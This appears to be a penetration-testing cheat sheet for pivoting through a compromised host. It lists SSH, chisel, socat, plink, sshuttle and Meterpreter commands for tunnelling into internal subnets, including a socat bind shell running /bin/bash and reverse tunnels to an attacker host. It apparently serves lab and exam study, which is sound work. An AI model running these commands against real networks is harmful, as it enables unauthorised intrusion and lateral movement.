1. Recon First

# On compromised host
ipconfig /all        # Windows â€“ check routes/subnets
route print          # Windows â€“ routing table
ifconfig / ip addr   # Linux â€“ interfaces and IPs
ip route             # Linux â€“ routing table


2. SSH Port Forwarding
Local Forward (attacker â†’ target via pivot)

ssh -L 8080:10.0.0.5:80 user@pivot
# Access http://127.0.0.1:8080 on attacker
Remote Forward (pivot â†’ attacker)

ssh -R 8080:127.0.0.1:80 user@pivot
Dynamic Forward (SOCKS proxy)

ssh -D 1080 user@pivot
# Then edit /etc/proxychains.conf
socks5  127.0.0.1 1080
proxychains nmap -sT -Pn 10.0.0.0/24

3. Chisel (fast & exam-friendly)
Upload chisel binary to pivot
	â€¢ Attacker (server):

chisel server -p 8000 --reverse
	â€¢ Pivot (client):

chisel client attacker_ip:8000 R:1080:socks
	â€¢ Use proxychains on attacker:

proxychains nmap -sT -Pn 10.0.0.0/24

4. Socat (Swiss army knife)
Forward remote RDP to attacker

# On pivot
socat TCP-LISTEN:3389,fork TCP:10.0.0.5:3389
Bind shell back to attacker

socat TCP-LISTEN:4444,fork EXEC:/bin/bash

5. Plink (Windows pivot helper)
Remote port forward

plink.exe -R 445:127.0.0.1:445 attacker@ip -pw password
Dynamic SOCKS proxy

plink.exe -D 1080 attacker@ip -pw password

6. SSHuttle (VPN-style routing)

sshuttle -r user@pivot 10.0.0.0/24
# Routes whole subnet via SSH, no proxychains needed

7. Meterpreter (Metasploit)

meterpreter > run autoroute -s 10.0.0.0/24
meterpreter > use auxiliary/server/socks_proxy
Then:

proxychains smbclient -L //10.0.0.5/
